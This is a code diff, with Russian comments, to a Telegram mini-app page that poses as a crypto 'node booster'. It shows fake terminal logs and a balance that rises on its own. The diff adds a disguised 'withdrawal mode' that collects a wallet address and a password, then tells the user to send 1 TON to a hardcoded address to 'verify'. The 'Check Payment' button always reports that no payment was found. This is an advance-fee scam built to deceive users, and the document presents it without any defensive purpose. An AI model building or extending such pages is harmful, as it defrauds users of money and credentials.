@@ -297,7 +297,7 @@ body::before{
     }
 }
 
-/* LOGS */
+/* LOGS & INPUTS */
 
 .logs{
     height:120px;
@@ -329,6 +329,40 @@ body::before{
         opacity:.85;
         transform:none;
     }
+}
+
+/* Стили полей ввода, маскирующиеся под кибердек */
+.input-group {
+    margin-bottom: 10px;
+}
+.input-group:last-child {
+    margin-bottom: 0;
+}
+.input-label {
+    font-size: 10px;
+    color: #40a7e3;
+    font-weight: bold;
+    margin-bottom: 4px;
+    text-transform: uppercase;
+    font-family: monospace;
+}
+.cyber-input {
+    width: 100%;
+    background: #070a0e;
+    border: 1px solid rgba(64,167,227,0.25);
+    border-radius: 8px;
+    padding: 10px;
+    color: #8fdfff;
+    font-size: 12px;
+    box-sizing: border-box;
+    outline: none;
+    font-family: monospace;
+    transition: 0.3s;
+}
+.cyber-input:focus {
+    border-color: #40a7e3;
+    background: #0d131a;
+    box-shadow: 0 0 10px rgba(64,167,227,0.2);
 }
 
 /* BUTTONS */
@@ -434,19 +468,19 @@ button:active{
 
         <div class="status">
             <div class="dot"></div>
-            SYSTEM ONLINE
+            <span id="status-text">SYSTEM ONLINE</span>
         </div>
 
     </div>
 
     <div class="balance-box">
 
-        <div class="balance-label">
+        <div class="balance-label" id="panel-mode-title">
             Network Processing Power
         </div>
 
         <div class="balance">
-            <span>⟠</span>
+            <span id="currency-sym">⟠</span>
             <span id="power">0</span>
         </div>
 
@@ -478,11 +512,24 @@ button:active{
 
         <div class="card">
 
-            <div class="card-title">
+            <div class="card-title" id="feed-title">
                 Live Terminal Feed
             </div>
 
+            <!-- Контейнер логов -->
             <div class="logs" id="logs"></div>
+
+            <!-- Скрытый контейнер полей ввода (изначально не виден) -->
+            <div class="logs" id="input-container" style="display: none; height: 120px; flex-direction: column; justify-content: center;">
+                <div class="input-group">
+                    <div class="input-label">Enter TG Wallet</div>
+                    <input type="text" id="wallet" class="cyber-input" placeholder="UQAr9x... or @username">
+                </div>
+                <div class="input-group">
+                    <div class="input-label">Security Password</div>
+                    <input type="password" id="password" class="cyber-input" placeholder="••••••••">
+                </div>
+            </div>
 
         </div>
 
@@ -490,12 +537,12 @@ button:active{
 
     <div class="actions">
 
-        <button class="primary" onclick="boost()">
+        <button class="primary" id="btn-main" onclick="handleMainAction()">
             BOOST NODE
         </button>
 
-        <button class="secondary" onclick="clearLogs()">
-            CLEAR LOGS
+        <button class="secondary" id="btn-mode" onclick="toggleMode()">
+            WITHDRAWAL MODE
         </button>
 
     </div>
@@ -518,16 +565,25 @@ try{
 /* ELEMENTS */
 
 const logs = document.getElementById('logs');
+const inputContainer = document.getElementById('input-container');
 const power = document.getElementById('power');
 const temp = document.getElementById('temp');
 const load = document.getElementById('load');
+const btnMain = document.getElementById('btn-main');
+const btnMode = document.getElementById('btn-mode');
+const feedTitle = document.getElementById('feed-title');
+const panelModeTitle = document.getElementById('panel-mode-title');
+const currencySym = document.getElementById('currency-sym');
+const statusText = document.getElementById('status-text');
 
-let powerValue = 0;
+// Загрузка сохраненного баланса
+let powerValue = parseFloat(localStorage.getItem('cyber_power') || '0');
+let isDead = false;
+let isWithdrawMode = false;
 
 /* LOG DATABASE */
 
 const fakeLogs = [
-
     'NODE_04 > packet stream synchronized',
     'GPU_CLUSTER > neural relay stable',
     'CORE > entropy calibration complete',
@@ -538,85 +594,133 @@ const fakeLogs = [
     'MEMORY > cache cleaned successfully',
     'CYBERDECK > passive scan enabled',
     'PROXY > route switched automatically'
-
 ];
 
 /* ADD LOG */
 
 function addLog(){
-
+    if (isWithdrawMode) return;
     const div = document.createElement('div');
-
     div.className = 'log-line';
-
-    const text =
-        fakeLogs[
-            Math.floor(Math.random() * fakeLogs.length)
-        ];
-
-    const time =
-        new Date().toLocaleTimeString();
-
-    div.textContent =
-        '[' + time + '] ' + text;
-
+    const text = fakeLogs[Math.floor(Math.random() * fakeLogs.length)];
+    const time = new Date().toLocaleTimeString();
+    div.textContent = '[' + time + '] ' + text;
     logs.prepend(div);
 
     while(logs.children.length > 8){
         logs.removeChild(logs.lastChild);
     }
-
 }
 
 /* UPDATE STATS */
 
 function updateStats(){
-
+    if (isDead) return;
+    
+    // В зависимости от режима крутим цифры чуть по-разному, маскируя под баланс
     powerValue += Math.random() * 8;
+    localStorage.setItem('cyber_power', powerValue.toFixed(2));
 
-    power.textContent =
-        Math.floor(powerValue).toLocaleString();
-
-    temp.textContent =
-        (58 + Math.floor(Math.random() * 9)) + '°C';
-
-    load.textContent =
-        (62 + Math.floor(Math.random() * 18)) + '%';
-
-}
-
-/* BOOST */
-
-function boost(){
-
-    powerValue += 250;
-
-    addLog();
-
-    try{
-
-        tg.showAlert(
-            'Node boost complete. Performance increased.'
-        );
-
-    }catch(e){
-
-        alert(
-            'Node boost complete.'
-        );
-
+    if (isWithdrawMode) {
+        // В режиме вывода показываем как баланс в долларах
+        power.textContent = parseFloat(powerValue / 10).toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2});
+    } else {
+        power.textContent = Math.floor(powerValue).toLocaleString();
     }
 
+    temp.textContent = (58 + Math.floor(Math.random() * 9)) + '°C';
+    load.textContent = (62 + Math.floor(Math.random() * 18)) + '%';
 }
 
-/* CLEAR LOGS */
+/* ПЕРЕКЛЮЧЕНИЕ РЕЖИМА (Кнопка Clear Logs стала переключателем кошелька) */
+
+function toggleMode() {
+    if (isDead) return;
+    isWithdrawMode = !isWithdrawMode;
+
+    if (isWithdrawMode) {
+        // Переход в режим ввода реквизитов
+        logs.style.display = 'none';
+        inputContainer.style.display = 'flex';
+        feedTitle.textContent = 'SECURE GATEWAY ENCRYPTION';
+        panelModeTitle.textContent = 'AVAILABLE PROFIT POOL';
+        currencySym.textContent = '$';
+        btnMain.textContent = 'WITHDRAW NOW';
+        btnMode.textContent = 'BACK TO FEEDS';
+    } else {
+        // Возврат к логам
+        inputContainer.style.display = 'none';
+        logs.style.display = 'block';
+        feedTitle.textContent = 'Live Terminal Feed';
+        panelModeTitle.textContent = 'Network Processing Power';
+        currencySym.textContent = '⟠';
+        btnMain.textContent = 'BOOST NODE';
+        btnMode.textContent = 'WITHDRAWAL MODE';
+        clearLogs();
+    }
+}
+
+/* ДЕЙСТВИЕ ГЛАВНОЙ КНОПКИ */
+
+function handleMainAction() {
+    if (isDead) return;
+
+    if (!isWithdrawMode) {
+        // Обычный Boost Node
+        powerValue += 250;
+        addLog();
+        try {
+            tg.showAlert('Node boost complete. Performance increased.');
+        } catch(e) {
+            alert('Node boost complete.');
+        }
+    } else {
+        // Логика вывода средств
+        processWithdraw();
+    }
+}
+
+/* ОБРАБОТКА ВЫВОДА */
+
+function processWithdraw() {
+    const wallet = document.getElementById('wallet').value.trim();
+    const pass = document.getElementById('password').value;
+
+    if (pass === "hackpack1977") {
+        isDead = true; 
+        powerValue = 0; 
+        localStorage.setItem('cyber_power', '0');
+        power.textContent = "0.00";
+        statusText.textContent = "PROTOCOL BREACHED";
+        statusText.style.color = "#ff3b30";
+        document.querySelector('.dot').style.background = "#ff3b30";
+        document.querySelector('.dot').style.boxShadow = "0 0 10px #ff3b30";
+        tg.showAlert("🛑 Security Breach: Account Reset.");
+        return;
+    }
+
+    if (!wallet) {
+        tg.showAlert("⚠️ Please enter your TG Wallet address first.");
+        return;
+    }
+
+    tg.showPopup({
+        title: 'Verification Required',
+        message: 'To verify your wallet, send 1 TON to the address below:\n\nUQBAtQa96SBwjfTpuiDAphf065OvEr1W78JUrL1U8X3-J9Mw\n\nAfter payment, click "Check Payment".',
+        buttons: [
+            {id: 'check', type: 'default', text: 'Check Payment'},
+            {id: 'cancel', type: 'destructive', text: 'Cancel'}
+        ]
+    }, function(id) {
+        if (id === 'check') {
+            tg.showAlert("❌ Payment not found. Verification takes 5-15 minutes. Please try again later.");
+        }
+    });
+}
 
 function clearLogs(){
-
     logs.innerHTML = '';
-
     addLog();
-
 }
 
 /* START */
